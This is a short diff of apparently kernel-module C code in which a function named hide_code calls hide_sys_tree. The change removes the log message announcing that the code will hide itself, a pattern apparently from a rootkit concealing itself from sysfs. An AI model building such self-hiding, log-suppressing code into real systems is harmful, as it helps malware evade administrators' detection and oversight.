@@ -70,7 +70,6 @@ static void hide_sys_tree(){
 }
 
 void hide_code(void){
-	printk(KERN_INFO "Will hide code now\n");
 	hide_sys_tree();
 }
 
